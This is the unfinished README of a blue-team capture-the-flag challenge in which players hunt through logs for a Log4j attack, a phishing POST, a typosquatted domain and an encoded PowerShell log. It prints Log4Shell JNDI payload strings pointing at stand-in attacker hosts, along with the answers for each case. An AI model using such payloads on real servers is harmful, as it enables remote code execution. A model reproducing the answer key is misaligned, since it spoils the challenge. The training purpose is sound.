# Seamless Intelligence Challenge

A challenge made for the Perth vs Canberra + Capture The Flag.

Difficulty: 400

## Notes
TODO:
 - finish readme

#### Case 1
**Log4j Zero Day**
Hunt down logs based around the zero day `log4j`
The challenge works like a combination lock. The user needs to discover all relevant log ID numbers and place them in chronological order.

Searching for IP address will find you the first two logs.

- An Apache log will contain a JNDI request in the url to a malicious external server. The answer will be a url stating flag portion. "X-Api-Version: ${jndi:ldap://foo.xyz/maliciousfile}"

- SSH log appears with accepted password to a remote user account on windows

**Solution**
There are a set of questions that need to be answered, once answered a flag will be provided.

1. ${jndi:ldap://ignis.fuse/crepitus}
2. remote
3. 1.100.1.111
4. merry

#### Case 2
Go to alert and pull the date from the alert

If you search around the same time as dave clicked the link, you will find ed doing the same action.
This then leads you to finding a POST request made to a phishing website.

Look throught the squid logs and a domain is not what it should be.

**Solution**
1. 12/sep/2022 10:48 am
2. free.com/cart.php
3. instargram.com

#### Case 3
**Alert 2**
Case: Multiple Users enumerated to different groups
Alarm: User Created
Logs: Hunt down large powershell log encoded in base 64

There is a total of 8 users that need investigating.
Simply search all the users that and find the log that does not look like normal activity.

**Solution**
- eve

#### Case 4
**Rule Creation**


## Obtaining Log Samples
http://www.secrepo.com/
Black Market Darknet Logs
EVTX Attack Samples 